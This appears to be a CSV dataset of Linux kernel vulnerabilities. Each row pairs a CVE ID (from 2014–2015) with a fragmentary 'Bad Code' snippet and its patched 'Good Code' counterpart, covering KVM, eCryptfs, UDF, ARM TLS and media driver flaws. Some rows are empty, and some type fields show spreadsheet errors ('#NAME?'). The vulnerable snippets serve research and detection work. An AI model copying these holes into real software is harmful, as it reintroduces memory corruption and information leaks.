Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2015,DoS +Priv ,CVE-2015-0239,"	 * Not recognized on AMD in compat mode (but is recognized in legacy
	 * mode).
	 */
	if ((ctxt->mode == X86EMUL_MODE_PROT32) && (efer & EFER_LMA)
	    && !vendor_intel(ctxt))
		return emulate_ud(ctxt);

	setup_syscalls_segments(ctxt, &cs, &ss);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);
	switch (ctxt->mode) {
	case X86EMUL_MODE_PROT32:
		if ((msr_data & 0xfffc) == 0x0)
			return emulate_gp(ctxt, 0);
		break;
	case X86EMUL_MODE_PROT64:
		if (msr_data == 0x0)
			return emulate_gp(ctxt, 0);
		break;
	default:
		break;
	}

	ctxt->eflags &= ~(EFLG_VM | EFLG_IF);
	cs_sel = (u16)msr_data;
	cs_sel &= ~SELECTOR_RPL_MASK;
	ss_sel = cs_sel + 8;
	ss_sel &= ~SELECTOR_RPL_MASK;
	if (ctxt->mode == X86EMUL_MODE_PROT64 || (efer & EFER_LMA)) {
		cs.d = 0;
		cs.l = 1;
	}
	ops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_EIP, &msr_data);
	ctxt->_eip = msr_data;

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_ESP, &msr_data);
	*reg_write(ctxt, VCPU_REGS_RSP) = msr_data;


	return X86EMUL_CONTINUE;
}
","	 * Not recognized on AMD in compat mode (but is recognized in legacy
	 * mode).
	 */
	if ((ctxt->mode != X86EMUL_MODE_PROT64) && (efer & EFER_LMA)
	    && !vendor_intel(ctxt))
		return emulate_ud(ctxt);

	setup_syscalls_segments(ctxt, &cs, &ss);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);
	if ((msr_data & 0xfffc) == 0x0)
		return emulate_gp(ctxt, 0);











	ctxt->eflags &= ~(EFLG_VM | EFLG_IF);
	cs_sel = (u16)msr_data & ~SELECTOR_RPL_MASK;

	ss_sel = cs_sel + 8;
	if (efer & EFER_LMA) {

		cs.d = 0;
		cs.l = 1;
	}
	ops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_EIP, &msr_data);
	ctxt->_eip = (efer & EFER_LMA) ? msr_data : (u32)msr_data;

	ops->get_msr(ctxt, MSR_IA32_SYSENTER_ESP, &msr_data);
	*reg_write(ctxt, VCPU_REGS_RSP) = (efer & EFER_LMA) ? msr_data :
							      (u32)msr_data;

	return X86EMUL_CONTINUE;
}
"
2017,DoS +Priv ,CVE-2014-9940," gpiod_put(pin->gpiod);
 list_del(&pin->list);
 kfree(pin);


			} else {
				pin->request_count--;
			}
"," gpiod_put(pin->gpiod);
 list_del(&pin->list);
 kfree(pin);
				rdev->ena_pin = NULL;
 return;
			} else {
				pin->request_count--;
			}
"
2017,#NAME?,CVE-2014-9922,"	s->s_maxbytes = path.dentry->d_sb->s_maxbytes;
	s->s_blocksize = path.dentry->d_sb->s_blocksize;
	s->s_magic = ECRYPTFS_SUPER_MAGIC;








	inode = ecryptfs_get_inode(path.dentry->d_inode, s);
	rc = PTR_ERR(inode);
	}
	ufs->lower_namelen = statfs.f_namelen;










	ufs->upper_mnt = clone_private_mount(&upperpath);
	err = PTR_ERR(ufs->upper_mnt);
 if (IS_ERR(ufs->upper_mnt)) {
 */
#include <linux/quota.h>







/** 
 * enum positive_aop_returns - aop return codes with specific semantics
 *
 struct list_lru		s_dentry_lru ____cacheline_aligned_in_smp;
 struct list_lru		s_inode_lru ____cacheline_aligned_in_smp;
 struct rcu_head		rcu;





};

extern struct timespec current_fs_time(struct super_block *sb);
","	s->s_maxbytes = path.dentry->d_sb->s_maxbytes;
	s->s_blocksize = path.dentry->d_sb->s_blocksize;
	s->s_magic = ECRYPTFS_SUPER_MAGIC;
	s->s_stack_depth = path.dentry->d_sb->s_stack_depth + 1;

	rc = -EINVAL;
 if (s->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {
 pr_err(""eCryptfs: maximum fs stacking depth exceeded\n"");
 goto out_free;
	}

	inode = ecryptfs_get_inode(path.dentry->d_inode, s);
	rc = PTR_ERR(inode);
	}
	ufs->lower_namelen = statfs.f_namelen;

	sb->s_stack_depth = max(upperpath.mnt->mnt_sb->s_stack_depth,
				lowerpath.mnt->mnt_sb->s_stack_depth) + 1;

	err = -EINVAL;
 if (sb->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {
 pr_err(""overlayfs: maximum fs stacking depth exceeded\n"");
 goto out_put_workpath;
	}

	ufs->upper_mnt = clone_private_mount(&upperpath);
	err = PTR_ERR(ufs->upper_mnt);
 if (IS_ERR(ufs->upper_mnt)) {
 */
#include <linux/quota.h>

/*
 * Maximum number of layers of fs stack.  Needs to be limited to
 * prevent kernel stack overflow
 */
#define FILESYSTEM_MAX_STACK_DEPTH 2

/** 
 * enum positive_aop_returns - aop return codes with specific semantics
 *
 struct list_lru		s_dentry_lru ____cacheline_aligned_in_smp;
 struct list_lru		s_inode_lru ____cacheline_aligned_in_smp;
 struct rcu_head		rcu;

 /*
	 * Indicates how deep in a filesystem stack this SB is
 */
 int s_stack_depth;
};

extern struct timespec current_fs_time(struct super_block *sb);
"
2017,DoS +Priv ,CVE-2014-9914,"}
EXPORT_SYMBOL(ip4_datagram_connect);





void ip4_datagram_release_cb(struct sock *sk)
{
 const struct inet_sock *inet = inet_sk(sk);
 const struct ip_options_rcu *inet_opt;
	__be32 daddr = inet->inet_daddr;

 struct flowi4 fl4;
 struct rtable *rt;

 if (! __sk_dst_get(sk) || __sk_dst_check(sk, 0))
 return;

 rcu_read_lock();






	inet_opt = rcu_dereference(inet->inet_opt);
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;
	rt = ip_route_output_ports(sock_net(sk), &fl4, sk, daddr,
				   inet->inet_saddr, inet->inet_dport,
				   inet->inet_sport, sk->sk_protocol,
 RT_CONN_FLAGS(sk), sk->sk_bound_dev_if);
 if (!IS_ERR(rt))
 __sk_dst_set(sk, &rt->dst);


 rcu_read_unlock();
}
EXPORT_SYMBOL_GPL(ip4_datagram_release_cb);
","}
EXPORT_SYMBOL(ip4_datagram_connect);

/* Because UDP xmit path can manipulate sk_dst_cache without holding
 * socket lock, we need to use sk_dst_set() here,
 * even if we own the socket lock.
 */
void ip4_datagram_release_cb(struct sock *sk)
{
 const struct inet_sock *inet = inet_sk(sk);
 const struct ip_options_rcu *inet_opt;
	__be32 daddr = inet->inet_daddr;
 struct dst_entry *dst;
 struct flowi4 fl4;
 struct rtable *rt;




 rcu_read_lock();

	dst = __sk_dst_get(sk);
 if (!dst || !dst->obsolete || dst->ops->check(dst, 0)) {
 rcu_read_unlock();
 return;
	}
	inet_opt = rcu_dereference(inet->inet_opt);
 if (inet_opt && inet_opt->opt.srr)
		daddr = inet_opt->opt.faddr;
	rt = ip_route_output_ports(sock_net(sk), &fl4, sk, daddr,
				   inet->inet_saddr, inet->inet_dport,
				   inet->inet_sport, sk->sk_protocol,
 RT_CONN_FLAGS(sk), sk->sk_bound_dev_if);

	dst = !IS_ERR(rt) ? &rt->dst : NULL;
 sk_dst_set(sk, dst);

 rcu_read_unlock();
}
EXPORT_SYMBOL_GPL(ip4_datagram_release_cb);
"
2016,DoS Overflow ,CVE-2014-9904,"{
 /* first let's check the buffer parameter's */
 if (params->buffer.fragment_size == 0 ||
  params->buffer.fragments > SIZE_MAX / params->buffer.fragment_size)
 return -EINVAL;

 /* now codec parameters */
","{
 /* first let's check the buffer parameter's */
 if (params->buffer.fragment_size == 0 ||
  params->buffer.fragments > INT_MAX / params->buffer.fragment_size)
 return -EINVAL;

 /* now codec parameters */
"
2016,#NAME?,CVE-2014-9903,"		attr->size = usize;
	}

	ret = copy_to_user(uattr, attr, usize);
 if (ret)
 return -EFAULT;

","		attr->size = usize;
	}

	ret = copy_to_user(uattr, attr, attr->size);
 if (ret)
 return -EFAULT;

"
2016,#NAME?,CVE-2014-9900,,
2016,#NAME?,CVE-2014-9895,"
 for (p = 0; p < entity->num_pads; p++) {
 struct media_pad_desc pad;


 media_device_kpad_to_upad(&entity->pads[p], &pad);
 if (copy_to_user(&links->pads[p], &pad, sizeof(pad)))
 return -EFAULT;
 if (entity->links[l].source->entity != entity)
 continue;


 media_device_kpad_to_upad(entity->links[l].source,
						  &link.source);
 media_device_kpad_to_upad(entity->links[l].sink,
","
 for (p = 0; p < entity->num_pads; p++) {
 struct media_pad_desc pad;

 memset(&pad, 0, sizeof(pad));
 media_device_kpad_to_upad(&entity->pads[p], &pad);
 if (copy_to_user(&links->pads[p], &pad, sizeof(pad)))
 return -EFAULT;
 if (entity->links[l].source->entity != entity)
 continue;

 memset(&link, 0, sizeof(link));
 media_device_kpad_to_upad(entity->links[l].source,
						  &link.source);
 media_device_kpad_to_upad(entity->links[l].sink,
"
2016,#NAME?,CVE-2014-9892,,
2016,#NAME?,CVE-2014-9870," struct cpu_context_save	cpu_context;	/* cpu context */
	__u32			syscall;	/* syscall number */
	__u8			used_cp[16];	/* thread used copro */
 unsigned long		tp_value;
#ifdef CONFIG_CRUNCH
 struct crunch_state	crunchstate;
#endif
#define __ASMARM_TLS_H

#ifdef __ASSEMBLY__
	.macro set_tls_none, tp, tmp1, tmp2

	.endm

	.macro set_tls_v6k, tp, tmp1, tmp2

	mcr	p15, 0, \tp, c13, c0, 3		@ set TLS register
 mov	\tmp1, #0
 mcr	p15, 0, \tmp1, c13, c0, 2	@ clear user r/w TLS register
	.endm

	.macro set_tls_v6, tp, tmp1, tmp2
	ldr	\tmp1, =elf_hwcap
	ldr	\tmp1, [\tmp1, #0]
	mov	\tmp2, #0xffff0fff
	tst	\tmp1, #HWCAP_TLS		@ hardware TLS available?
	mcrne	p15, 0, \tp, c13, c0, 3		@ yes, set TLS register
	movne	\tmp1, #0
	mcrne	p15, 0, \tmp1, c13, c0, 2	@ clear user r/w TLS register
	streq	\tp, [\tmp2, #-15]		@ set TLS value at 0xffff0ff0




	.endm

	.macro set_tls_software, tp, tmp1, tmp2
	mov	\tmp1, #0xffff0fff
	str	\tp, [\tmp1, #-15]		@ set TLS value at 0xffff0ff0
	.endm
#ifdef CONFIG_TLS_REG_EMUL
#define tls_emu 1
#define has_tls_reg 1
#define set_tls		set_tls_none
#elif defined(CONFIG_CPU_V6)
#define tls_emu 0
#define has_tls_reg		(elf_hwcap & HWCAP_TLS)
#define set_tls		set_tls_v6
#elif defined(CONFIG_CPU_32v6K)
#define tls_emu 0
#define has_tls_reg 1
#define set_tls		set_tls_v6k
#else
#define tls_emu 0
#define has_tls_reg 0
#define set_tls		set_tls_software
#endif












#endif /* __ASMARM_TLS_H */
 UNWIND(.fnstart	)
 UNWIND(.cantunwind	)
 add	ip, r1, #TI_CPU_SAVE
	ldr	r3, [r2, #TI_TP_VALUE]
 ARM(	stmia	ip!, {r4 - sl, fp, sp, lr} )	@ Store most regs on stack
 THUMB(	stmia	ip!, {r4 - sl, fp}	   )	@ Store most regs on stack
 THUMB(	str	sp, [ip], #4		   )
 THUMB(	str	lr, [ip], #4		   )


#ifdef CONFIG_CPU_USE_DOMAINS
	ldr	r6, [r2, #TI_CPU_DOMAIN]
#endif
 set_tls	r3, r4, r5
#if defined(CONFIG_CC_STACKPROTECTOR) && !defined(CONFIG_SMP)
	ldr	r7, [r2, #TI_TASK]
	ldr	r8, =__stack_chk_guard
#include <asm/thread_notify.h>
#include <asm/stacktrace.h>
#include <asm/mach/time.h>


#ifdef CONFIG_CC_STACKPROTECTOR
#include <linux/stackprotector.h>
 clear_ptrace_hw_breakpoint(p);

 if (clone_flags & CLONE_SETTLS)
		thread->tp_value = childregs->ARM_r3;


 thread_notify(THREAD_NOTIFY_COPY, thread);

#endif

 case PTRACE_GET_THREAD_AREA:
			ret = put_user(task_thread_info(child)->tp_value,
				       datap);
 break;

 return regs->ARM_r0;

 case NR(set_tls):
		thread->tp_value = regs->ARM_r0;
 if (tls_emu)
 return 0;
 if (has_tls_reg) {
 int reg = (instr >> 12) & 15;
 if (reg == 15)
 return 1;
	regs->uregs[reg] = current_thread_info()->tp_value;
	regs->ARM_pc += 4;
 return 0;
}
"," struct cpu_context_save	cpu_context;	/* cpu context */
	__u32			syscall;	/* syscall number */
	__u8			used_cp[16];	/* thread used copro */
 unsigned long		tp_value[2];	/* TLS registers */
#ifdef CONFIG_CRUNCH
 struct crunch_state	crunchstate;
#endif
#define __ASMARM_TLS_H

#ifdef __ASSEMBLY__
#include <asm/asm-offsets.h>
	.macro switch_tls_none, base, tp, tpuser, tmp1, tmp2
	.endm

	.macro switch_tls_v6k, base, tp, tpuser, tmp1, tmp2
	mrc	p15, 0, \tmp2, c13, c0, 2	@ get the user r/w register
	mcr	p15, 0, \tp, c13, c0, 3		@ set TLS register
 mcr	p15, 0, \tpuser, c13, c0, 2	@ and the user r/w register
 str	\tmp2, [\base, #TI_TP_VALUE + 4] @ save it
	.endm

	.macro switch_tls_v6, base, tp, tpuser, tmp1, tmp2
	ldr	\tmp1, =elf_hwcap
	ldr	\tmp1, [\tmp1, #0]
	mov	\tmp2, #0xffff0fff
	tst	\tmp1, #HWCAP_TLS		@ hardware TLS available?



	streq	\tp, [\tmp2, #-15]		@ set TLS value at 0xffff0ff0
	mrcne	p15, 0, \tmp2, c13, c0, 2	@ get the user r/w register
	mcrne	p15, 0, \tp, c13, c0, 3		@ yes, set TLS register
	mcrne	p15, 0, \tpuser, c13, c0, 2	@ set user r/w register
	strne	\tmp2, [\base, #TI_TP_VALUE + 4] @ save it
	.endm

	.macro switch_tls_software, base, tp, tpuser, tmp1, tmp2
	mov	\tmp1, #0xffff0fff
	str	\tp, [\tmp1, #-15]		@ set TLS value at 0xffff0ff0
	.endm
#ifdef CONFIG_TLS_REG_EMUL
#define tls_emu 1
#define has_tls_reg 1
#define switch_tls	switch_tls_none
#elif defined(CONFIG_CPU_V6)
#define tls_emu 0
#define has_tls_reg		(elf_hwcap & HWCAP_TLS)
#define switch_tls	switch_tls_v6
#elif defined(CONFIG_CPU_32v6K)
#define tls_emu 0
#define has_tls_reg 1
#define switch_tls	switch_tls_v6k
#else
#define tls_emu 0
#define has_tls_reg 0
#define switch_tls	switch_tls_software
#endif

#ifndef __ASSEMBLY__
static inline unsigned long get_tpuser(void)
{
 unsigned long reg = 0;

 if (has_tls_reg && !tls_emu)
 __asm__(""mrc p15, 0, %0, c13, c0, 2"" : ""=r"" (reg));

 return reg;
}
#endif
#endif /* __ASMARM_TLS_H */
 UNWIND(.fnstart	)
 UNWIND(.cantunwind	)
 add	ip, r1, #TI_CPU_SAVE

 ARM(	stmia	ip!, {r4 - sl, fp, sp, lr} )	@ Store most regs on stack
 THUMB(	stmia	ip!, {r4 - sl, fp}	   )	@ Store most regs on stack
 THUMB(	str	sp, [ip], #4		   )
 THUMB(	str	lr, [ip], #4		   )
	ldr	r4, [r2, #TI_TP_VALUE]
	ldr	r5, [r2, #TI_TP_VALUE + 4]
#ifdef CONFIG_CPU_USE_DOMAINS
	ldr	r6, [r2, #TI_CPU_DOMAIN]
#endif
 switch_tls r1, r4, r5, r3, r7
#if defined(CONFIG_CC_STACKPROTECTOR) && !defined(CONFIG_SMP)
	ldr	r7, [r2, #TI_TASK]
	ldr	r8, =__stack_chk_guard
#include <asm/thread_notify.h>
#include <asm/stacktrace.h>
#include <asm/mach/time.h>
#include <asm/tls.h>

#ifdef CONFIG_CC_STACKPROTECTOR
#include <linux/stackprotector.h>
 clear_ptrace_hw_breakpoint(p);

 if (clone_flags & CLONE_SETTLS)
		thread->tp_value[0] = childregs->ARM_r3;
	thread->tp_value[1] = get_tpuser();

 thread_notify(THREAD_NOTIFY_COPY, thread);

#endif

 case PTRACE_GET_THREAD_AREA:
			ret = put_user(task_thread_info(child)->tp_value[0],
				       datap);
 break;

 return regs->ARM_r0;

 case NR(set_tls):
		thread->tp_value[0] = regs->ARM_r0;
 if (tls_emu)
 return 0;
 if (has_tls_reg) {
 int reg = (instr >> 12) & 15;
 if (reg == 15)
 return 1;
	regs->uregs[reg] = current_thread_info()->tp_value[0];
	regs->ARM_pc += 4;
 return 0;
}
"
2016,#NAME?,CVE-2014-9803,"#define PAGE_COPY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)
#define PAGE_READONLY __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN | PTE_UXN)
#define PAGE_READONLY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)
#define PAGE_EXECONLY __pgprot(_PAGE_DEFAULT | PTE_NG | PTE_PXN)

#define __P000  PAGE_NONE
#define __P001  PAGE_READONLY
#define __P010  PAGE_COPY
#define __P011  PAGE_COPY
#define __P100 PAGE_EXECONLY
#define __P101  PAGE_READONLY_EXEC
#define __P110  PAGE_COPY_EXEC
#define __P111  PAGE_COPY_EXEC
#define __S001  PAGE_READONLY
#define __S010  PAGE_SHARED
#define __S011  PAGE_SHARED
#define __S100 PAGE_EXECONLY
#define __S101  PAGE_READONLY_EXEC
#define __S110  PAGE_SHARED_EXEC
#define __S111  PAGE_SHARED_EXEC
#define pte_write(pte)		(!!(pte_val(pte) & PTE_WRITE))
#define pte_exec(pte)		(!(pte_val(pte) & PTE_UXN))

#define pte_valid_ng(pte) \
	((pte_val(pte) & (PTE_VALID | PTE_NG)) == (PTE_VALID | PTE_NG))

static inline pte_t pte_wrprotect(pte_t pte)
{
static inline void set_pte_at(struct mm_struct *mm, unsigned long addr,
 pte_t *ptep, pte_t pte)
{
 if (pte_valid_ng(pte)) {
 if (!pte_special(pte) && pte_exec(pte))
 __sync_icache_dcache(pte, addr);
 if (pte_dirty(pte) && pte_write(pte))
good_area:
 /*
	 * Check that the permissions on the VMA allow for the fault which
	 * occurred.

 */
 if (!(vma->vm_flags & vm_flags)) {
		fault = VM_FAULT_BADACCESS;
 struct task_struct *tsk;
 struct mm_struct *mm;
 int fault, sig, code;
 unsigned long vm_flags = VM_READ | VM_WRITE;
 unsigned int mm_flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;

	tsk = current;
","#define PAGE_COPY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)
#define PAGE_READONLY __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN | PTE_UXN)
#define PAGE_READONLY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)


#define __P000  PAGE_NONE
#define __P001  PAGE_READONLY
#define __P010  PAGE_COPY
#define __P011  PAGE_COPY
#define __P100 PAGE_READONLY_EXEC
#define __P101  PAGE_READONLY_EXEC
#define __P110  PAGE_COPY_EXEC
#define __P111  PAGE_COPY_EXEC
#define __S001  PAGE_READONLY
#define __S010  PAGE_SHARED
#define __S011  PAGE_SHARED
#define __S100 PAGE_READONLY_EXEC
#define __S101  PAGE_READONLY_EXEC
#define __S110  PAGE_SHARED_EXEC
#define __S111  PAGE_SHARED_EXEC
#define pte_write(pte)		(!!(pte_val(pte) & PTE_WRITE))
#define pte_exec(pte)		(!(pte_val(pte) & PTE_UXN))

#define pte_valid_user(pte) \
	((pte_val(pte) & (PTE_VALID | PTE_USER)) == (PTE_VALID | PTE_USER))

static inline pte_t pte_wrprotect(pte_t pte)
{
static inline void set_pte_at(struct mm_struct *mm, unsigned long addr,
 pte_t *ptep, pte_t pte)
{
 if (pte_valid_user(pte)) {
 if (!pte_special(pte) && pte_exec(pte))
 __sync_icache_dcache(pte, addr);
 if (pte_dirty(pte) && pte_write(pte))
good_area:
 /*
	 * Check that the permissions on the VMA allow for the fault which
	 * occurred. If we encountered a write or exec fault, we must have
	 * appropriate permissions, otherwise we allow any permission.
 */
 if (!(vma->vm_flags & vm_flags)) {
		fault = VM_FAULT_BADACCESS;
 struct task_struct *tsk;
 struct mm_struct *mm;
 int fault, sig, code;
 unsigned long vm_flags = VM_READ | VM_WRITE | VM_EXEC;
 unsigned int mm_flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;

	tsk = current;
"
2015,#NAME?,CVE-2014-9731," continue;
		}

		flen = udf_get_filename(dir->i_sb, nameptr, fname, lfi);

 if (!flen)
 continue;

 if (!lfi)
 continue;

		flen = udf_get_filename(dir->i_sb, nameptr, fname, lfi);

 if (flen && udf_match(flen, fname, child->len, child->name))
 goto out_ok;
	}
#include <linux/buffer_head.h>
#include ""udf_i.h""

static void udf_pc_to_char(struct super_block *sb, unsigned char *from,
  int fromlen, unsigned char *to)
{
 struct pathComponent *pc;
 int elen = 0;

 unsigned char *p = to;



 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);
 switch (pc->componentType) {
 break;
 /* Fall through */
 case 2:


			p = to;
			*p++ = '/';

 break;
 case 3:


 memcpy(p, ""../"", 3);
			p += 3;

 break;
 case 4:


 memcpy(p, ""./"", 2);
			p += 2;

 /* that would be . - just ignore */
 break;
 case 5:
			p += udf_get_filename(sb, pc->componentIdent, p,
					      pc->lengthComponentIdent);





			*p++ = '/';

 break;
		}
		elen += sizeof(struct pathComponent) + pc->lengthComponentIdent;
		p[-1] = '\0';
 else
		p[0] = '\0';

}

static int udf_symlink_filler(struct file *file, struct page *page)
 symlink = bh->b_data;
	}

 udf_pc_to_char(inode->i_sb, symlink, inode->i_size, p);
 brelse(bh);



 up_read(&iinfo->i_data_sem);
 SetPageUptodate(page);
}

/* unicode.c */
extern int udf_get_filename(struct super_block *, uint8_t *, uint8_t *, int);

extern int udf_put_filename(struct super_block *, const uint8_t *, uint8_t *,
 int);
extern int udf_build_ustr(struct ustr *, dstring *, int);

#include ""udf_sb.h""

static int udf_translate_to_linux(uint8_t *, uint8_t *, int, uint8_t *, int);


static int udf_char_to_ustr(struct ustr *dest, const uint8_t *src, int strlen)
{
 return u_len + 1;
}

int udf_get_filename(struct super_block *sb, uint8_t *sname, uint8_t *dname,
 int flen)
{
 struct ustr *filename, *unifilename;
 int len = 0;
 if (!unifilename)
 goto out1;

 if (udf_build_ustr_exact(unifilename, sname, flen))
 goto out2;

 if (UDF_QUERY_FLAG(sb, UDF_FLAG_UTF8)) {
	} else
 goto out2;

	len = udf_translate_to_linux(dname, filename->u_name, filename->u_len,

				     unifilename->u_name, unifilename->u_len);
out2:
 kfree(unifilename);
#define EXT_MARK '.'
#define CRC_MARK '#'
#define EXT_SIZE 5



static int udf_translate_to_linux(uint8_t *newName, uint8_t *udfName,
 int udfLen, uint8_t *fidName,
 int fidNameLen)
{
 int index, newIndex = 0, needsCRC = 0;
 int extIndex = 0, newExtIndex = 0, hasExt = 0;
					newExtIndex = newIndex;
				}
			}
 if (newIndex < 256)
				newName[newIndex++] = curr;
 else
				needsCRC = 1;
				}
				ext[localExtIndex++] = curr;
			}
			maxFilenameLen = 250 - localExtIndex;
 if (newIndex > maxFilenameLen)
				newIndex = maxFilenameLen;
 else
				newIndex = newExtIndex;
		} else if (newIndex > 250)
			newIndex = 250;
		newName[newIndex++] = CRC_MARK;
		valueCRC = crc_itu_t(0, fidName, fidNameLen);
		newName[newIndex++] = hex_asc_upper_hi(valueCRC >> 8);
"," continue;
		}

		flen = udf_get_filename(dir->i_sb, nameptr, lfi, fname,
					UDF_NAME_LEN);
 if (!flen)
 continue;

 if (!lfi)
 continue;

		flen = udf_get_filename(dir->i_sb, nameptr, lfi, fname,
					UDF_NAME_LEN);
 if (flen && udf_match(flen, fname, child->len, child->name))
 goto out_ok;
	}
#include <linux/buffer_head.h>
#include ""udf_i.h""

static int udf_pc_to_char(struct super_block *sb, unsigned char *from,
 int fromlen, unsigned char *to, int tolen)
{
 struct pathComponent *pc;
 int elen = 0;
 int comp_len;
 unsigned char *p = to;

 /* Reserve one byte for terminating \0 */
	tolen--;
 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);
 switch (pc->componentType) {
 break;
 /* Fall through */
 case 2:
 if (tolen == 0)
 return -ENAMETOOLONG;
			p = to;
			*p++ = '/';
			tolen--;
 break;
 case 3:
 if (tolen < 3)
 return -ENAMETOOLONG;
 memcpy(p, ""../"", 3);
			p += 3;
			tolen -= 3;
 break;
 case 4:
 if (tolen < 2)
 return -ENAMETOOLONG;
 memcpy(p, ""./"", 2);
			p += 2;
			tolen -= 2;
 /* that would be . - just ignore */
 break;
 case 5:
			comp_len = udf_get_filename(sb, pc->componentIdent,
						    pc->lengthComponentIdent,
						    p, tolen);
			p += comp_len;
			tolen -= comp_len;
 if (tolen == 0)
 return -ENAMETOOLONG;
			*p++ = '/';
			tolen--;
 break;
		}
		elen += sizeof(struct pathComponent) + pc->lengthComponentIdent;
		p[-1] = '\0';
 else
		p[0] = '\0';
 return 0;
}

static int udf_symlink_filler(struct file *file, struct page *page)
 symlink = bh->b_data;
	}

 err = udf_pc_to_char(inode->i_sb, symlink, inode->i_size, p, PAGE_SIZE);
 brelse(bh);
 if (err)
 goto out_unlock_inode;

 up_read(&iinfo->i_data_sem);
 SetPageUptodate(page);
}

/* unicode.c */
extern int udf_get_filename(struct super_block *, uint8_t *, int, uint8_t *,
 int);
extern int udf_put_filename(struct super_block *, const uint8_t *, uint8_t *,
 int);
extern int udf_build_ustr(struct ustr *, dstring *, int);

#include ""udf_sb.h""

static int udf_translate_to_linux(uint8_t *, int, uint8_t *, int, uint8_t *,
 int);

static int udf_char_to_ustr(struct ustr *dest, const uint8_t *src, int strlen)
{
 return u_len + 1;
}

int udf_get_filename(struct super_block *sb, uint8_t *sname, int slen,
 uint8_t *dname, int dlen)
{
 struct ustr *filename, *unifilename;
 int len = 0;
 if (!unifilename)
 goto out1;

 if (udf_build_ustr_exact(unifilename, sname, slen))
 goto out2;

 if (UDF_QUERY_FLAG(sb, UDF_FLAG_UTF8)) {
	} else
 goto out2;

	len = udf_translate_to_linux(dname, dlen,
				     filename->u_name, filename->u_len,
				     unifilename->u_name, unifilename->u_len);
out2:
 kfree(unifilename);
#define EXT_MARK '.'
#define CRC_MARK '#'
#define EXT_SIZE 5
/* Number of chars we need to store generated CRC to make filename unique */
#define CRC_LEN 5

static int udf_translate_to_linux(uint8_t *newName, int newLen,
 uint8_t *udfName, int udfLen,
 uint8_t *fidName, int fidNameLen)
{
 int index, newIndex = 0, needsCRC = 0;
 int extIndex = 0, newExtIndex = 0, hasExt = 0;
					newExtIndex = newIndex;
				}
			}
 if (newIndex < newLen)
				newName[newIndex++] = curr;
 else
				needsCRC = 1;
				}
				ext[localExtIndex++] = curr;
			}
			maxFilenameLen = newLen - CRC_LEN - localExtIndex;
 if (newIndex > maxFilenameLen)
				newIndex = maxFilenameLen;
 else
				newIndex = newExtIndex;
		} else if (newIndex > newLen - CRC_LEN)
			newIndex = newLen - CRC_LEN;
		newName[newIndex++] = CRC_MARK;
		valueCRC = crc_itu_t(0, fidName, fidNameLen);
		newName[newIndex++] = hex_asc_upper_hi(valueCRC >> 8);
"
